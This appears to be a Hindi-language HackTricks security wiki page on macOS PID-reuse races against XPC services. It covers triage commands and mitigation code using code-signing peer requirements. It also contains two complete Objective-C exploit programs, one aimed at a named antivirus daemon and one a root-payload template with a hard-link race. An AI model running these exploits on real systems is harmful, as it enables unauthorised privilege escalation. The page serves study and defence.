# macOS PID Reuse

{{#include ../../../../../../banners/hacktricks-training.md}}

## PID Reuse

जब कोई macOS **XPC service** प्राप्त message से जुड़े credentials का उपयोग करने के बजाय caller को उसके **PID** को resolve करके authenticate करती है, तो वह PID reuse attack के प्रति vulnerable हो सकती है। इसका practical primitive PID namespace के wrap होने का इंतज़ार करना नहीं है: attacker एक XPC request भेजता है और तुरंत **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** को **`POSIX_SPAWN_SETEXEC`** के साथ call करता है, जिससे attacker के process image को एक **allowed binary** से replace कर दिया जाता है और **PID बना रहता है**।<sup>[[1]](#references)[[2]](#references)</sup>

यदि server request को dequeue करने के बाद ही उस numeric PID को code-signing, entitlement, path या parent-process checks के लिए किसी live process से resolve करता है, तो उसे message भेजने वाले process के बजाय replacement binary दिखाई देती है। **`POSIX_SPAWN_START_SUSPENDED`** trusted replacement को server द्वारा check किए जाने तक alive और stable रखता है।<sup>[[1]](#references)[[2]](#references)</sup>

### वास्तव में किस चीज़ की race होती है

Vulnerable sequence केवल “PIDs दोहराए जा सकते हैं” नहीं है, बल्कि एक **message-identity TOCTOU** है:<sup>[[1]](#references)[[2]](#references)</sup>

1. एक attacker process XPC connection स्थापित या resume करता है और privileged request को queue करता है।
2. इससे पहले कि service connection के PID को `SecCodeRef` या किसी अन्य process object में convert करे, attacker **`POSIX_SPAWN_SETEXEC`** का उपयोग करके उसी process को एक approved executable से overlay कर देता है।
3. Service उस PID से वर्तमान में जुड़े approved image को validate करती है, फिर पहले से queued attacker-controlled request को dispatch करती है।

Authorization data flow में कोई भी PID bridge संदिग्ध है: `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid` या `audit_token_to_pid`, जिसके बाद `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)` या कोई custom signature verifier आता हो। केवल logging के लिए उपयोग किया गया PID पर्याप्त नहीं है; पुष्टि करें कि वह allow/deny decision तक पहुंचता है। Error paths की भी जांच करें: पहले audit-token lookup का प्रयास करना लेकिन **failure पर PID पर fallback करना** उसी race को फिर से सक्षम कर देता है। यह fallback pattern Intego की privileged XPC services के 2026 analysis में दिखाई दिया था।<sup>[[3]](#references)</sup>

### Fast static और dynamic triage

Connection handler से शुरुआत करें और प्रत्येक PID-producing call को code-signing, entitlement, executable-path या version checks तक trace करें। ये commands किसी candidate helper पर quick first pass प्रदान करते हैं; stripped binaries में भी आम तौर पर imported symbols, Objective-C selectors या diagnostic strings मौजूद रहते हैं:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
एक नियंत्रित test के दौरान, PID source और उसके verifier दोनों को break या hook करें। `xpc_connection_get_pid` या `-processIdentifier` पर hit केवल एक lead है; उपयोगी evidence request प्राप्त होने के बाद **उसी integer** का बाद में किया गया lookup है। Frida application-specific verifier और privileged selector को भी hook कर सकता है, ताकि यह मापा जा सके कि PID race जीतने पर selector execute होता है या नहीं।<sup>[[3]](#references)</sup>

### Exploit example

यदि आपको **`shouldAcceptNewConnection`** function या उसके द्वारा call किया जाने वाला ऐसा function मिलता है जो **`processIdentifier`** को **call** करता है और **`auditToken`** को call नहीं करता, तो इसकी अत्यधिक संभावना है कि यह audit token के बजाय **process PID को verify कर रहा है**।\
उदाहरण के लिए, इस image में (जो reference से ली गई है):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

इस example exploit को देखें (फिर से reference से लिया गया है), ताकि exploit के 2 parts देख सकें:<sup>[[1]](#references)</sup>

- एक जो कई forks **generate करता है**
- **Each fork**, message भेजने के तुरंत बाद **`posix_spawn`** execute करते हुए XPC service को **payload भेजेगा**

> [!CAUTION]
> Objective-C process से `fork()` के साथ race करते समय, exploit को `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` exported के साथ launch करें या `__objc_fork_ok` marker embed करें:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
**NSTasks** और children को launch करने के लिए argument का उपयोग करने वाला पहला option, ताकि RC‑
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
यह उदाहरण **`fork`** का उपयोग करके ऐसे **children लॉन्च करता है जो PID race condition का exploit करेंगे**, और फिर **Hard link के माध्यम से एक अन्य race condition का exploit** करता है:
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## race को reproducible बनाना

Working PID-reuse exploits और हाल के privileged-helper testing में निम्न tuning points बार-बार दिखाई देते हैं:<sup>[[1]](#references)[[3]](#references)</sup>

- Request भेजें और तुरंत `posix_spawn` call करें; reply का इंतज़ार **न** करें। Request पहले से queued होनी चाहिए, जबकि server का PID lookup image replacement के बाद होता है।
- `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED` को साथ रखें। पहला flag racing process का PID बनाए रखता है; दूसरा validation से पहले valid target को exit करने या state बदलने से रोकता है।
- कई short-lived racers का उपयोग करें और पूरी connection/request/exec sequence को retry करें। Optimal count target पर निर्भर करता है; अत्यधिक children service को धीमा कर सकते हैं और window को और खराब कर सकते हैं।
- Replacement को server की **पूरी** requirement पूरी करनी चाहिए। संभव हो तो legitimate client binary का reuse करें और पहले उसकी designated requirement को `codesign -d -r- "/path/to/client.app"` से check करें।
- पहले किसी harmless exported selector या read-only method को invoke करें। इससे authentication जीतने और बाद में किसी privileged primitive का सफलतापूर्वक exploit करने के बीच अंतर स्पष्ट होता है।

## PID bridge से बचना

macOS 13+ पर, Foundation `-[NSXPCConnection setCodeSigningRequirement:]` expose करता है। Peer requirement को ठीक एक बार और `resume` से **पहले** set करें; malformed requirement strings exception (या Swift fatal error) raise करते हैं, और ऐसा peer का message जो requirement पूरी नहीं करता, connection को invalid कर देता है। इससे XPC application code द्वारा PID resolve किए बिना peer की code identity enforce कर सकता है।<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
Modern low-level listener API में macOS 26+ के लिए, `xpc_listener_set_peer_requirement` listener के inactive होने पर एक validated `xpc_peer_requirement_t` लागू करता है। XPC उन requests को drop कर देता है जो इसे पूरा नहीं करतीं; listener से बनाए गए peer sessions इसे inherit **नहीं** करते, इसलिए जब वे sessions privileged operations को authorize करें, तब एक उपयुक्त session requirement भी लागू करें।<sup>[[7]](#references)</sup>

> [!WARNING]
> वास्तविक `SecCode` lookup के लिए audit token को copy करके फिर उसे PID में convert करके इसे “ठीक” न करें। Authorization decision तक audit-token-derived identity बनाए रखें, या शुरू से अंत तक XPC peer-requirement API का उपयोग करें।<sup>[[2]](#references)[[6]](#references)</sup> Connection-wide audit-token APIs में भी एक अलग race class होती है, जिसका विवरण [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md) में दिया गया है।

## अन्य उदाहरण

- [**Intego X9: आपके macOS antivirus को PIDs पर भरोसा क्यों नहीं करना चाहिए**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - ऐसे AV के privileged helper के विरुद्ध LPE, जिसने clients को PID के आधार पर authenticate किया था।<sup>[[3]](#references)</sup>
- [**Privilege escalation के लिए macOS में GOG Galaxy XPC service का exploitation**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Part II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [XPC exploitation सीखें - Part 2: PID को ना कहें!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [PID पर भरोसा न करें! एक simple logic bug की कहानियां और इसे कहां खोजें - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: आपके macOS antivirus को PIDs पर भरोसा क्यों नहीं करना चाहिए](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [Privilege escalation के लिए macOS में GOG Galaxy XPC service का exploitation](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Part II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
